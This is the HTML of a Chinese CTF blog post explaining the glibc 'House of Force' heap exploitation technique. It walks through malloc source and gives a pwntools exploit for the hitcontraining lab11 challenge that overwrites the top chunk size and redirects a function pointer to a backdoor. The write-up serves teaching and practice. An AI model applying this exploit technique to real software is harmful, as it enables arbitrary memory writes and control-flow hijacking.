@@ -1,0 +1,398 @@
+
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+    <meta charset="utf-8" />
+    <title>house_of_force | Collectcrop&#39;s Blog</title>
+    <meta name="author" content="collectcrop" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>COLLECTCROP&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;COLLECTCROP&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>house_of_force</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/10/3
+        </span>
+        
+        <span class="category">
+            <a href="/categories/pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                pwn
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #00a596">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/heap/" style="color: #00bcd4">
+                    heap
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/house-of/" style="color: #ff7d73">
+                    house of
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>能控制top chunk的size域</li>
+<li>能获取heap_base，进而计算出top_chunk的地址</li>
+<li>能自由控制堆分配尺寸大小</li>
+</ul>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
+<li><p>将top chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p>
+</li>
+<li><p>精准计算top chunk的地址与target addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top chunk的data域直接位于target addr处。</p>
+</li>
+<li><p>再申请一个chunk，往目标地址处写入值。</p>
+</li>
+</ul>
+<h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
+<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
+<pre><code class="c++">victim = av-&gt;top;
+size = chunksize (victim);
+
+if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
+&#123;
+  remainder_size = size - nb;			//分配后剩下的大小
+  remainder = chunk_at_offset (victim, nb);		//剩下的chunk
+  av-&gt;top = remainder;							//更新top chunk
+  set_head (victim, nb | PREV_INUSE |			//设置从原topchunk分配出的chunk的头部
+            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+  set_head (remainder, remainder_size | PREV_INUSE);	//设置新的top chunk的头部
+
+  check_malloced_chunk (av, victim, nb);
+  void *p = chunk2mem (victim);
+  alloc_perturb (p, bytes);
+  return p;
+&#125;
+</code></pre>
+<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
+<pre><code class="c++">#define REQUEST_OUT_OF_RANGE(req)                                 \
+  ((unsigned long) (req) &gt;=						      \
+   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))
+
+/* pad request bytes into a usable size -- internal version */
+
+#define request2size(req)                                         \
+  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
+
+/* Same, except also perform an argument and result check.  First, we check
+   that the padding done by request2size didn&#39;t result in an integer
+   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting
+   size isn&#39;t so large that a later alignment would lead to another integer
+   overflow.  */
+#define checked_request2size(req, sz) \
+(&#123;				    \
+  (sz) = request2size (req);	    \
+  if (((sz) &lt; (req))		    \			//调整后的sz一定要比传入的bytes要大
+      || REQUEST_OUT_OF_RANGE (sz)) \		//一般都会满足，申请的大小不要太大就行
+    &#123;				    \
+      __set_errno (ENOMEM);	    \
+      return 0;			    \
+    &#125;				    \
+&#125;)
+</code></pre>
+<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
+<img src="/2024/10/03/house-of-force/image-20241003002907725.png" class="">
+
+<p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
+<pre><code class="c++">#define MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	//32位系统上通常为0x7,64位上为0xf
+#define SIZE_SZ (sizeof(size_t))		//32位系统上通常为4,64位上为8
+#define MINSIZE  \
+  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))
+#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	//0x20
+
+(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
+</code></pre>
+<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img src="/2024/10/03/house-of-force/image-20241003002919869.png" class="">
+
+<img src="/2024/10/03/house-of-force/image-20241003002937355.png" class="">
+
+
+
+<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
+<img src="/2024/10/03/house-of-force/image-20241003002948587.png" class="">
+
+<img src="/2024/10/03/house-of-force/image-20241003002955916.png" class="">
+
+
+
+<img src="/2024/10/03/house-of-force/image-20241003003131870.png" class="">
+
+
+
+<img src="/2024/10/03/house-of-force/image-20241003003143107.png" class="">
+
+<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
+<p>先把板子套上：</p>
+<pre><code class="python">def add(size,content):
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;2&#39;)
+    p.sendlineafter(&quot;Please enter the length of item name:&quot;,str(size).encode())
+    p.sendlineafter(&quot;Please enter the name of item:&quot;,content)
+
+def show():
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)
+
+def edit(idx,size,content):
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;3&#39;)
+    p.sendlineafter(&quot;Please enter the index of item:&quot;,str(idx).encode())
+    p.sendlineafter(&quot;Please enter the length of item name:&quot;,str(size).encode())
+    p.sendlineafter(&quot;Please enter the new name of the item:&quot;,content)
+
+def delete(idx):
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;4&#39;)
+    p.sendlineafter(&quot;Please enter the index of item:&quot;,str(idx).encode())
+
+def end():
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;5&#39;)
+</code></pre>
+<p>具体打法：</p>
+<p>首先溢出改top chunk的size域</p>
+<pre><code class="python">magic = 0x0000000000400D49
+
+add(0x30,b&quot;AAAA&quot;)   #0
+edit(0,0x40,b&quot;A&quot;*0x38+p64(0xfffffffffffffff1))
+</code></pre>
+<img src="/2024/10/03/house-of-force/image-20241003003151793.png" class="">
+
+<p>然后算出偏移后申请一个目标大小的chunk</p>
+<pre><code class="python">off = -0x60 - 0x8 - 0xf
+add(off,b&quot;AAAA&quot;)    #1
+</code></pre>
+<img src="/2024/10/03/house-of-force/image-20241003003155240.png" class="">
+
+<p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
+<pre><code class="python">add(0x10,p64(magic)*2)
+end()
+
+p.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Collectcrop&#39;s Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;collectcrop
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
